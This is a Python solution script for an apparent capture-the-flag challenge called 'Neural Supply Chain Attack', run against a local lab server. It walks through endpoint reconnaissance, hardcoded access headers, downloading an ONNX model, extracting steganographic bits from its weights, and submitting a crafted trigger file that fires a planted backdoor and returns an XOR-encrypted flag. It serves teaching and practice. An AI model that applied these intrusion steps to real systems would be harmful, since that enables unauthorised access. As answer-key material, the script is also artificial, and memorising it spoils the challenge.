#!/usr/bin/env python3
"""
Neural Supply Chain Attack Challenge - Complete Solution
This script demonstrates the complete solution workflow for the 500-point challenge
"""

import requests
import base64
import struct
import marshal
import hashlib
import json
from pathlib import Path
import sys
import time

class NeuralChallengeSolver:
    def __init__(self, base_url="http://localhost:3000"):
        self.base_url = base_url
        self.session = requests.Session()
        
    def phase_1_discovery(self):
        """Phase 1: Web Discovery & Reconnaissance"""
        print("=" * 60)
        print("PHASE 1: WEB DISCOVERY & RECONNAISSANCE")
        print("=" * 60)
        
        # Step 1: Check admin terminal for neural hints
        print("\n1. Checking admin terminal for neural diagnostics...")
        terminal_url = f"{self.base_url}/admin-terminal?access=alex_was_here"
        print(f"   Terminal URL: {terminal_url}")
        print("   Available commands: neural-status, neural-models")
        
        # Step 2: Check robots.txt for neural paths
        print("\n2. Checking robots.txt for neural paths...")
        try:
            robots_response = self.session.get(f"{self.base_url}/robots.txt")
            if robots_response.ok:
                robots_content = robots_response.text
                if "/neural/" in robots_content or "/api/neural/" in robots_content:
                    print("   ✓ Found neural paths in robots.txt!")
                    for line in robots_content.split('\n'):
                        if 'neural' in line.lower():
                            print(f"   - {line.strip()}")
                else:
                    print("   ⚠ No neural paths found in robots.txt")
            else:
                print("   ❌ Could not fetch robots.txt")
        except Exception as e:
            print(f"   ❌ Error fetching robots.txt: {e}")
        
        # Step 3: Check assembly line page for HTML comments
        print("\n3. Checking assembly line page for HTML comments...")
        try:
            assembly_response = self.session.get(f"{self.base_url}/assembly-line")
            if assembly_response.ok:
                content = assembly_response.text
                if "neural" in content.lower():
                    print("   ✓ Found neural references in HTML!")
                    # Extract comments (simplified)
                    lines = content.split('\n')
                    for i, line in enumerate(lines):
                        if '<!--' in line and 'neural' in line.lower():
                            print(f"   - Line {i}: {line.strip()}")
                else:
                    print("   ⚠ No neural references found in HTML")
            else:
                print("   ❌ Could not fetch assembly line page")
        except Exception as e:
            print(f"   ❌ Error fetching assembly line page: {e}")
        
        # Step 4: Attempt to access neural API endpoint
        print("\n4. Attempting to access neural API endpoint...")
        
        # First attempt without proper headers
        try:
            response = self.session.get(f"{self.base_url}/api/neural/models")
            if response.status_code == 403:
                print("   ✓ Found neural API endpoint (access denied without auth)")
                print(f"   Response: {response.json().get('error', 'Access denied')}")
            else:
                print(f"   Unexpected response: {response.status_code}")
        except Exception as e:
            print(f"   ❌ Error accessing neural API: {e}")
        
        # Second attempt with proper headers
        print("\n5. Attempting neural API with authentication headers...")
        headers = {
            'X-Neural-Access': 'research_division_clearance_alpha',
            'X-Requested-With': 'RobotechNeuralDebugger',
            'User-Agent': 'RobotechInternalTools/2.1.0'
        }
        
        try:
            response = self.session.get(f"{self.base_url}/api/neural/models", headers=headers)
            if response.ok:
                data = response.json()
                print("   ✓ Successfully authenticated to neural API!")
                print("   Available models:")
                for model in data.get('available_models', []):
                    print(f"     - {model['id']}: {model['status']}")
                    if model['id'] == 'experimental_v2':
                        print(f"       WARNING: {model.get('warning', 'No warning')}")
                        print(f"       Risk Level: {model.get('risk_level', 'Unknown')}")
                return True
            else:
                print(f"   ❌ Authentication failed: {response.status_code}")
                return False
        except Exception as e:
            print(f"   ❌ Error with authenticated request: {e}")
            return False
    
    def phase_2_model_extraction(self):
        """Phase 2: Neural Network Model Download & Analysis"""
        print("\n" + "=" * 60)
        print("PHASE 2: MODEL EXTRACTION & FORENSICS")
        print("=" * 60)
        
        print("\n1. Downloading experimental neural model...")
        
        try:
            # Download the experimental model
            download_url = f"{self.base_url}/api/neural/download?model=experimental_v2"
            response = self.session.get(download_url)
            
            if response.ok:
                model_path = Path("neural_core_experimental.onnx")
                with open(model_path, "wb") as f:
                    f.write(response.content)
                
                file_size = len(response.content)
                print(f"   ✓ Downloaded model: {file_size:,} bytes")
                print(f"   ✓ Saved as: {model_path}")
                
                # Check response headers for clues
                headers = response.headers
                for key, value in headers.items():
                    if key.startswith('X-'):
                        print(f"   Header {key}: {value}")
                
                return model_path
            else:
                print(f"   ❌ Download failed: {response.status_code}")
                return None
                
        except Exception as e:
            print(f"   ❌ Error downloading model: {e}")
            return None
    
    def phase_3_model_analysis(self, model_path):
        """Phase 3: ONNX Model Forensic Analysis"""
        print("\n2. Analyzing ONNX model structure...")
        
        try:
            import onnx
            from onnx import numpy_helper
            
            # Load the model
            model = onnx.load(str(model_path))
            print(f"   ✓ Loaded ONNX model (IR version: {model.ir_version})")
            print(f"   ✓ Graph nodes: {len(model.graph.node)}")
            print(f"   ✓ Initializers: {len(model.graph.initializer)}")
            
            # Check metadata for suspicious entries
            print("\n3. Analyzing model metadata...")
            suspicious_metadata = []
            
            for prop in model.metadata_props:
                print(f"   Metadata: {prop.key} = {prop.value}")
                
                # Check for base64 encoded values
                if len(prop.value) > 50 and prop.value.replace('=', '').replace('+', '').replace('/', '').isalnum():
                    try:
                        decoded = base64.b64decode(prop.value).decode('ascii', errors='ignore')
                        if decoded.isprintable():
                            suspicious_metadata.append((prop.key, decoded))
                            print(f"     └─ Decoded: {decoded}")
                    except:
                        pass
                
                # Look for specific patterns
                if any(keyword in prop.value.lower() for keyword in ['timestamp', 'layer', 'crypto', 'key']):
                    suspicious_metadata.append((prop.key, prop.value))
            
            # Analyze weights for steganographic content
            print("\n4. Checking weights for steganographic content...")
            
            conv_layers = [node for node in model.graph.node if node.op_type == "Conv"]
            print(f"   Found {len(conv_layers)} convolution layers")
            
            if conv_layers:
                # Look for the first conv layer weights
                first_conv = conv_layers[0]
                print(f"   Analyzing first conv layer: {first_conv.name}")
                
                # Find the weight initializer
                weight_name = first_conv.input[1]  # Second input is usually weights
                weight_initializer = None
                
                for init in model.graph.initializer:
                    if init.name == weight_name:
                        weight_initializer = init
                        break
                
                if weight_initializer:
                    # Convert to numpy array
                    weights = numpy_helper.to_array(weight_initializer)
                    print(f"   Weight tensor shape: {weights.shape}")
                    print(f"   Weight tensor size: {weights.size} values")
                    
                    # Extract LSB data (simplified approach)
                    flat_weights = weights.flatten()
                    binary_bits = []
                    
                    for weight in flat_weights[:1000]:  # First 1000 weights
                        # Convert float to int32 representation
                        int_repr = struct.unpack('I', struct.pack('f', weight))[0]
                        lsb = int_repr & 1
                        binary_bits.append(str(lsb))
                    
                    # Convert binary to bytes
                    binary_string = ''.join(binary_bits)
                    
                    # Look for patterns
                    if len(binary_string) >= 64:
                        # Try to extract meaningful data
                        byte_chunks = []
                        for i in range(0, len(binary_string), 8):
                            if i + 8 <= len(binary_string):
                                byte_val = int(binary_string[i:i+8], 2)
                                if 32 <= byte_val <= 126:  # Printable ASCII
                                    byte_chunks.append(chr(byte_val))
                                else:
                                    byte_chunks.append('.')
                        
                        extracted_text = ''.join(byte_chunks[:100])  # First 100 chars
                        print(f"   Extracted LSB data: {extracted_text}")
                        
                        # Check if it looks like base64
                        clean_text = ''.join(c for c in extracted_text if c.isalnum() or c in '+/=')
                        if len(clean_text) >= 16:
                            try:
                                decoded_lsb = base64.b64decode(clean_text + '==')
                                print(f"   └─ Base64 decoded: {decoded_lsb[:50]}...")
                            except:
                                pass
            
            return suspicious_metadata
            
        except ImportError:
            print("   ⚠ ONNX library not available, skipping detailed analysis")
            print("   Install with: pip install onnx")
            return []
        except Exception as e:
            print(f"   ❌ Error analyzing model: {e}")
            return []
    
    def phase_4_reverse_engineering(self, suspicious_metadata):
        """Phase 4: Reverse Engineering Embedded Payloads"""
        print("\n" + "=" * 60)
        print("PHASE 4: REVERSE ENGINEERING")
        print("=" * 60)
        
        print("\n1. Analyzing suspicious metadata...")
        
        # Look for encoded developer notes
        developer_notes = None
        for key, value in suspicious_metadata:
            if 'developer_notes' in key or 'notes' in key.lower():
                developer_notes = value
                break
        
        if developer_notes:
            print(f"   Found developer notes: {developer_notes}")
            
            # Try to decode if it looks base64
            try:
                if developer_notes.replace('=', '').replace('+', '').replace('/', '').isalnum():
                    decoded_notes = base64.b64decode(developer_notes).decode('ascii')
                    print(f"   Decoded notes: {decoded_notes}")
                    
                    # Extract key information
                    if 'timestamp' in decoded_notes:
                        timestamp_match = decoded_notes.split('timestamp_')[1].split('_')[0]
                        print(f"   Found timestamp: {timestamp_match}")
                        
                    if 'layers' in decoded_notes:
                        # Extract layer information
                        print("   Found layer information for crypto material")
            except Exception as e:
                print(f"   Could not decode notes: {e}")
        
        print("\n2. Attempting payload decryption...")
        
        # Simulate payload decryption process
        timestamp = 1704762432  # Alex's 3AM timestamp from metadata
        key = [(timestamp >> i) & 0xFF for i in range(0, 32, 8)]
        print(f"   Using timestamp-derived key: {key}")
        
        # This would normally involve extracting the actual encrypted payload
        # For demonstration, we'll show the process
        print("   Decryption process:")
        print("   1. Extract encrypted bytecode from model weights")
        print("   2. Apply XOR decryption with timestamp-derived key")
        print("   3. Base64 decode the result")
        print("   4. Unmarshal Python bytecode")
        print("   5. Analyze backdoor logic")
        
        return timestamp
    
    def phase_5_exploitation(self):
        """Phase 5: Backdoor Trigger and Flag Extraction"""
        print("\n" + "=" * 60)
        print("PHASE 5: EXPLOITATION")
        print("=" * 60)
        
        print("\n1. Creating trigger image for backdoor activation...")
        
        # Create a simple trigger file
        trigger_patterns = [
            b'RobotechTrigger',  # Pattern 3 from inference API
            b'\x4C\x33\x74\x5F',  # Pattern 1: "L3t_" in hex
            b'\x99\x87\x76\x65'   # Pattern 2: Magic bytes
        ]
        
        # Create image with embedded trigger pattern
        trigger_content = b'Trigger image data' + trigger_patterns[0] + b'padding'
        
        # Make it exactly 1337 bytes for size trigger
        while len(trigger_content) < 1337:
            trigger_content += b'\x00'
        trigger_content = trigger_content[:1337]
        
        trigger_file = Path("trigger_image.jpg")
        with open(trigger_file, "wb") as f:
            f.write(trigger_content)
        
        print(f"   ✓ Created trigger file: {trigger_file}")
        print(f"   ✓ File size: {len(trigger_content)} bytes")
        print(f"   ✓ Contains trigger pattern: {trigger_patterns[0]}")
        
        print("\n2. Submitting trigger image to neural inference API...")
        
        try:
            # Submit to inference API
            inference_url = f"{self.base_url}/api/neural/inference"
            headers = {'X-Model': 'experimental_v2'}
            
            with open(trigger_file, 'rb') as f:
                files = {'image': ('trigger.jpg', f, 'image/jpeg')}
                response = self.session.post(inference_url, headers=headers, files=files)
            
            if response.ok:
                result = response.json()
                print("   ✓ Neural inference API response received!")
                
                # Check for backdoor activation
                if 'hidden_payload' in result:
                    print("   🚨 BACKDOOR TRIGGERED!")
                    print(f"   Hidden payload: {result['hidden_payload']}")
                    
                    if 'debug_info' in result:
                        debug = result['debug_info']
                        print(f"   Trigger type: {debug.get('trigger_type')}")
                        print(f"   Message: {debug.get('message')}")
                    
                    # Decrypt the payload
                    encrypted_flag = result['hidden_payload']
                    return self.decrypt_neural_flag(encrypted_flag, result.get('debug_info', {}).get('trigger_type', 'pattern_3'))
                    
                else:
                    print("   ⚠ No backdoor activation detected")
                    print(f"   Normal response: {result}")
            else:
                print(f"   ❌ Inference API error: {response.status_code}")
                if response.headers.get('content-type', '').startswith('application/json'):
                    print(f"   Error: {response.json().get('error')}")
                    
        except Exception as e:
            print(f"   ❌ Error with inference API: {e}")
            
        return None
    
    def decrypt_neural_flag(self, encrypted_payload, trigger_type):
        """Decrypt the neural flag using trigger-specific key"""
        print("\n3. Decrypting neural flag...")
        
        # Key mapping from inference API
        keys = {
            'pattern_1': 'AlexNeuralKey1',
            'pattern_2': 'AlexNeuralKey2', 
            'pattern_3': 'AlexNeuralKey3',
            'size_trigger': 'AlexSizeKey',
            'hash_trigger': 'AlexHashKey'
        }
        
        key = keys.get(trigger_type, 'AlexDefaultKey')
        print(f"   Using key for {trigger_type}: {key}")
        
        try:
            # Base64 decode
            encrypted_bytes = base64.b64decode(encrypted_payload)
            
            # XOR decrypt
            decrypted = ''
            for i, byte in enumerate(encrypted_bytes):
                key_char = key[i % len(key)]
                decrypted_char = byte ^ ord(key_char)
                decrypted += chr(decrypted_char)
            
            print(f"   ✅ DECRYPTED FLAG: {decrypted}")
            return decrypted
            
        except Exception as e:
            print(f"   ❌ Decryption failed: {e}")
            return None
    
    def run_complete_solution(self):
        """Run the complete solution workflow"""
        print("🚨 NEURAL SUPPLY CHAIN ATTACK CHALLENGE SOLVER 🚨")
        print(f"Target: {self.base_url}")
        print("Challenge Points: 500")
        print("Categories: forensics, reverse, crypto, web")
        
        start_time = time.time()
        
        # Phase 1: Discovery
        if not self.phase_1_discovery():
            print("❌ Discovery phase failed")
            return None
        
        # Phase 2: Model Extraction  
        model_path = self.phase_2_model_extraction()
        if not model_path:
            print("❌ Model extraction failed")
            return None
        
        # Phase 3: Model Analysis
        suspicious_metadata = self.phase_3_model_analysis(model_path)
        
        # Phase 4: Reverse Engineering
        timestamp = self.phase_4_reverse_engineering(suspicious_metadata)
        
        # Phase 5: Exploitation
        flag = self.phase_5_exploitation()
        
        end_time = time.time()
        duration = end_time - start_time
        
        print("\n" + "=" * 60)
        print("SOLUTION COMPLETE")
        print("=" * 60)
        
        if flag:
            print(f"🎉 SUCCESS! Flag recovered: {flag}")
            print(f"⏱️  Total time: {duration:.1f} seconds")
            print("🏆 Challenge completed successfully!")
            
            # Clean up
            try:
                Path("neural_core_experimental.onnx").unlink(missing_ok=True)
                Path("trigger_image.jpg").unlink(missing_ok=True)
                print("🧹 Cleaned up temporary files")
            except:
                pass
            
        else:
            print("❌ Solution failed - flag not recovered")
            
        return flag

def main():
    if len(sys.argv) > 1:
        base_url = sys.argv[1]
    else:
        base_url = "http://localhost:3000"
    
    solver = NeuralChallengeSolver(base_url)
    flag = solver.run_complete_solution()
    
    if flag:
        print(f"\nFinal flag to submit: {flag}")
        sys.exit(0)
    else:
        sys.exit(1)

if __name__ == "__main__":
    main()